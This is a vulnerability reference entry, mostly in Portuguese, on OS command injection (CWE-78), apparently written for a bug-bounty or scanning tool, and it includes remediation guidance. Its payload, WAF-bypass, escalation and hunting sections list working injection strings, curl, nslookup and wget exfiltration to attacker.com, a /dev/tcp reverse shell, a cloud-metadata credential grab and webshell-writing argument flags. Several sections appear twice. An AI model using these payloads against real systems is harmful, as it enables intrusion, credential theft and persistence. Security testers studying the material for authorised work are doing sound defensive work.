---
id: command_injection
title: "OS Command Injection"
module: "cmdinjection"
severity: "CRITICAL"
cwe_id: "CWE-78"
cwe_title: "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
cvss_vector: "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
vrt_id: "injection.remote_code_execution.command_injection"
---

## Summary
Entrada do usuário é passada para um shell do sistema operacional sem sanitização, permitindo executar comandos arbitrários, ler arquivos, pivotar na rede e comprometer o servidor.

## Description
Command injection ocorre quando a aplicação monta comandos (`ping`, `nslookup`, `convert`, `ffmpeg`, `git`, `tar`, `curl`) concatenando entrada do usuário. Caracteres de controle (`;`, `|`, `&`, `` ` ``, `$()`, newline) permitem encadear comandos. Variantes:

- **In-band:** saída do comando é refletida na resposta.
- **Blind:** sem saída; confirmação por tempo (`sleep`) ou OOB (DNS/HTTP).
- **Argument injection:** não há shell, mas flags/valores controlam o comportamento do binário (ex.: `--output`, `-o`, `--config`).
- **Second-order:** payload armazenado é usado depois em um comando.

Linguagens com `Runtime.exec`, `ProcessBuilder`, `os.system`, `subprocess` com `shell=True`, `child_process.exec`, `backticks` e `system()` são vetores comuns.

## Impact
- Execução remota de código no servidor (RCE).
- Leitura/escrita de arquivos e exfiltração de dados.
- Instalação de backdoors, mineração e persistência.
- Movimento lateral e acesso a bancos/serviços internos.
- Negação de serviço e destruição de dados.
- Impacto CRITICAL.

## Payloads and Bypasses
```bash
# Separadores básicos
; id
| id
|| id
& id
&& id
`id`
$(id)
%0aid
%0d%0aid
%7cid
%26id

# Contexto de host/URL
127.0.0.1; id
127.0.0.1|id
127.0.0.1||id
127.0.0.1&id
127.0.0.1&&id
127.0.0.1%0aid
127.0.0.1%0d%0aid
127.0.0.1`id`
127.0.0.1$(id)

# Blind/time-based
; sleep 5
| sleep 5
$(sleep 5)
`sleep 5`
127.0.0.1; sleep 5

# OOB
; curl http://attacker.com/$(whoami)
; nslookup $(whoami).attacker.com
; wget http://attacker.com/$(cat /etc/passwd | base64)
; powershell -c "iwr http://attacker.com/$env:USERNAME"
```

WAF bypass:
```bash
# Espaços alternativos
cat$IFS/etc/passwd
cat${IFS}/etc/passwd
cat%09/etc/passwd
cat</etc/passwd

# Separação sem espaços
{cat,/etc/passwd}
cat$IFS$9/etc/passwd
$IFS$9id

# Ofuscação de comandos
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd
/???/??t /etc/passwd
$(printf 'id')
`printf 'id'`

# Base64
echo aWQ=|base64 -d|sh
echo aWQ= | base64 --decode | bash

# Variáveis
a=i;b=d;$a$b
```

Argument injection:
```bash
# Ferramentas que aceitam flags perigosas
--output=/var/www/html/shell.php
-o /etc/cron.d/backdoor
--config=http://attacker.com/evil.conf
--upload-pack=id
--checkpoint-action=exec=id
```

Casos reais e mentalidade de ataque (RWBH): Yahoo e Uber (ferramentas de diagnóstico/conversão) mostram injeção em ping/DNS e argument injection; o atacante usa `;`, `|`, `$IFS` e OOB quando a saída é cega.

## Target Context (Crawler Hints)
- **Parâmetros comuns:** `cmd`, `exec`, `command`, `ping`, `query`, `host`, `ip`, `domain`, `url`, `filename`, `dir`, `path`, `process`, `system`, `run`, `target`, `address`, `port`.
- **Paths comuns:** `/api/ping`, `/api/dns`, `/api/tools`, `/api/convert`, `/api/export`, `/api/backup`, `/admin/system`, `/diagnostics`, `/webhook`.
- **Sinais:** funcionalidades de ping/DNS/WHOIS; conversão de mídia; backup; erros com saída de shell; atraso com `sleep`; resposta com `uid=`.

## Escalation Techniques
- **RCE direto:** qualquer command injection e RCE -- `id`, `whoami`, reverse shell (`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`).
- **Exfiltracao OOB:** quando a saida nao e refletida, usar `curl http://attacker.com/$(whoami)` ou DNS (`nslookup $(cat /etc/passwd | base64).attacker.com`).
- **Persistence:** escrever crontab, SSH authorized_keys ou web shell para manter acesso.
- **Lateral movement:** usar credenciais do servidor (env vars, config files) para pivotar para banco, cloud e outros servicos.
- **Container escape:** se a app roda em container, verificar se ha montagens privilegiadas ou `--privileged` para escapar para o host.

## Hunting Methodology
1. Identificar funcionalidades que interagem com o OS: ping, DNS lookup, conversao de arquivos, backup, diagnosticos, webhook.
2. Injetar metacaracteres de shell: `;`, `|`, `||`, `&&`, `` ` ``, `$(...)`, `\n`, `%0a`.
3. Para blind injection: usar `sleep 5` e medir tempo de resposta; ou usar OOB com dominio controlado.
4. Testar argument injection: se o input e passado como argumento (nao como parte do comando), tentar `--help`, `-v`, ou opcoes que alterem comportamento.
5. Testar variacoes de encoding: URL encoding, double encoding, unicode, `$IFS` como separador.
6. Verificar se a aplicacao usa shell wrapper (`/bin/sh -c`) ou execucao direta -- shell wrapper amplia vetores.

## False Positive Indicators
- Aplicacao retorna erro ao receber metacaracteres mas nao executa o comando -- sanitizacao funciona.
- Timeout no response nao e causado por `sleep` mas por carga/rede -- repetir e comparar com baseline.
- OOB request recebido mas de IP diferente do servidor alvo -- pode ser scanner ou bot, nao a aplicacao.
- Funcionalidade usa API nativa (ex.: `InetAddress.getByName()`) e nao shell -- nao e command injection mesmo com input refletido em erro.

## Recommendation
1. Evitar shell: usar APIs nativas (`InetAddress`, bibliotecas de DNS, parsing de imagem) em vez de comandos.
2. Se for inevitável, usar `ProcessBuilder` com lista de argumentos e **não** `shell=True`/`Runtime.exec(String)`; validar cada argumento.
```java
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "1", validatedHost);
pb.redirectErrorStream(true);
Process p = pb.start();
```
3. Validar entrada com allowlist estrita (IP, hostname RFC, caminho conhecido); rejeitar metacaracteres e espaços.
4. Nunca passar entrada para `sh -c`, `bash -c`, `cmd /c`, `eval`, backticks ou `system`.
5. Aplicar least privilege ao processo, com usuário dedicado, filesystem read-only, seccomp/AppArmor e sem acesso à rede quando possível.
6. Usar filas e workers isolados para operações perigosas; limitar tempo, memória e saída.
7. Monitorar execuções, comandos anômalos e chamadas OOB; alertar.
8. Exemplo Python:
```python
import subprocess, shlex
subprocess.run(["ping", "-c", "1", validated_host], shell=False, timeout=5, check=True)
```
9. Testar com payloads de separadores e OOB em ambiente autorizado.

## Escalation Techniques

- **Command injection + reverse shell = persistent access:** after confirming injection, spawn a reverse shell (`bash -i >& /dev/tcp/attacker/port 0>&1`) to gain interactive access. From there, enumerate the host, install persistence (cron, SSH key), and pivot to internal services. (Bug Bounty Bootcamp, Ch. 18: RCE escalation via reverse shell.)
- **Command injection + cloud metadata = credential theft:** execute `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` to extract AWS IAM credentials, or equivalent for GCP/Azure metadata endpoints. Use the stolen credentials to access S3 buckets, databases, and cloud APIs.
- **Command injection + internal network scanning = lateral movement:** use the compromised host to scan internal networks and discover databases, admin panels, and other services not accessible from the internet. Internal services often lack authentication when behind a firewall.
- **Blind injection + OOB exfiltration = data theft:** when output is not reflected, exfiltrate data via DNS (`nslookup $(cat /etc/passwd | base64).attacker.com`) or HTTP (`curl attacker.com/$(whoami)`). This converts a blind vulnerability into a full data extraction channel.
- **Argument injection + file write = webshell:** in contexts where shell metacharacters are blocked but arguments are controllable, use tool-specific flags (`--output`, `-o`, `--config`, `--checkpoint-action=exec=`) to write files to the webroot or execute commands via the tool's own features.

## Hunting Methodology

1. **Identify OS command execution points.** Look for functionality that interacts with the OS: ping/traceroute tools, DNS lookups, file conversion (ImageMagick, FFmpeg), archive operations, backup/export, webhook delivery, and diagnostic endpoints. (Bug Bounty Bootcamp, Ch. 18: step 1 -- gather information about the target's technology stack.)
2. **Map input parameters.** Identify all parameters that feed into these features: `host`, `ip`, `domain`, `url`, `filename`, `cmd`, `command`, `target`, `address`. Check URL parameters, POST body, headers, and file uploads that get processed by command-line tools. (Bug Bounty Bootcamp, Ch. 18: step 2 -- identify suspicious user input locations.)
3. **Submit separator payloads.** Test each input with shell metacharacters: `;id`, `|id`, `||id`, `&id`, `&&id`, `` `id` ``, `$(id)`, `%0aid`. Start with in-band payloads that produce visible output. (Bug Bounty Bootcamp, Ch. 18: step 3 -- submit test payloads for code injection and command injection.)
4. **Test blind detection.** If no output is reflected, use time-based payloads (`; sleep 5`, `$(sleep 5)`) and observe response time. Also set up an OOB listener and test DNS/HTTP callbacks (`; nslookup $(whoami).attacker.com`).
5. **Apply WAF bypass techniques.** If basic payloads are blocked, try space alternatives (`$IFS`, `%09`, `<`), command obfuscation (`c'a't`, `c\at`, `/???/??t`), encoding (`echo aWQ=|base64 -d|sh`), and variable splitting (`a=i;b=d;$a$b`). (Bug Bounty Bootcamp, Ch. 18: bypassing RCE protection with quotes, wildcards, and hex encoding.)
6. **Confirm with harmless commands.** Verify the vulnerability using safe commands: `whoami`, `id`, `hostname`, `cat /etc/hostname`. Never execute destructive commands during authorized testing. (Bug Bounty Bootcamp, Ch. 18: step 4 -- confirm with harmless commands like whoami, ls, sleep 5.)

## False Positive Indicators

- **Timing anomaly without command execution:** `sleep 5` causes a delay, but the delay is due to server-side processing, network latency, or rate limiting rather than actual command execution. Confirm with a variable delay (`sleep 3` vs `sleep 7`) and check proportionality.
- **Error message reflects input but no execution:** the application shows an error like "Invalid host: 127.0.0.1;id" but does not execute the injected command. The input is rejected at validation, and the reflection is cosmetic, not indicative of injection.
- **Application uses parameterized process execution:** the backend uses `ProcessBuilder` with an argument list (not `shell=True` or `sh -c`). Metacharacters are passed as literal arguments to the target program, not interpreted by a shell. The process may fail or ignore them entirely.
- **Sandboxed or containerized execution:** the application executes commands in a minimal container with no shell, restricted filesystem, and no network access. While the injection technically succeeds, the impact is contained -- no data exfiltration or lateral movement is possible.
- **DNS callback received but from CDN or proxy:** an OOB DNS request to `attacker.com` originates from the CDN or WAF infrastructure (which may resolve the domain for inspection), not from the application server itself. Verify the source IP against the target's known infrastructure before confirming the finding.
